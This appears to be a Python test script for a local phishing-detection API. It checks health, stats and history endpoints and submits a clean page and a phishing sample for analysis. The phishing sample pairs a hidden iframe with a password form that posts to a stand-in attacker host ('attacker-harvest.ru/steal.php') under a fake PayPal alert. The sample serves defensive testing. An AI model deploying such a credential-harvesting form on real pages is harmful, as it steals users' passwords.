import requests
import json

base = 'http://127.0.0.1:8000'

# Test 1: Model Info
r = requests.get(f'{base}/model/info')
print('=== MODEL INFO ===')
print(r.status_code, json.dumps(r.json(), indent=2))

# Test 2: Health
r = requests.get(f'{base}/api/health')
print('\n=== HEALTH ===')
print(r.status_code, r.json())

# Test 3: Clean HTML Analyze
clean_html = """<!DOCTYPE html>
<html>
<head><title>Wikipedia, the free encyclopedia</title></head>
<body>
<h1>Wikipedia</h1>
<p>The Free Encyclopedia</p>
<a href="https://en.wikipedia.org/wiki/Main_Page">Main Page</a>
<form action="https://en.wikipedia.org/w/index.php" method="get">
<input type="text" name="search" />
<input type="submit" value="Search" />
</form>
</body>
</html>"""

r = requests.post(f'{base}/api/analyze', json={'url': 'https://en.wikipedia.org/wiki/Main_Page', 'html_content': clean_html})
print('\n=== CLEAN HTML ANALYZE ===')
print('Status:', r.status_code)
print(json.dumps(r.json(), indent=2))

# Test 4: Phishing with deceptive HTML
phish_html = """<!DOCTYPE html>
<html>
<head><title>Account Verification Required</title></head>
<body>
<h2>Suspicious Login Alert</h2>
<iframe src="http://evil-tracker.com/sink" style="display:none"></iframe>
<form action="http://attacker-harvest.ru/steal.php" method="POST">
<label>Confirm Password:</label>
<input type="password" name="pwd" />
<input type="submit" value="Verify Now" />
</form>
</body>
</html>"""

r = requests.post(f'{base}/api/analyze', json={'url': 'http://secure-paypal-login-alert.top/verify', 'html_content': phish_html})
print('\n=== PHISH HTML ANALYZE ===')
print('Status:', r.status_code)
print(json.dumps(r.json(), indent=2))

# Test 5: Stats
r = requests.get(f'{base}/api/stats')
print('\n=== STATS ===')
print(r.status_code, json.dumps(r.json(), indent=2))

# Test 6: History
r = requests.get(f'{base}/api/history')
print('\n=== HISTORY COUNT ===')
print('Total history items:', len(r.json()))
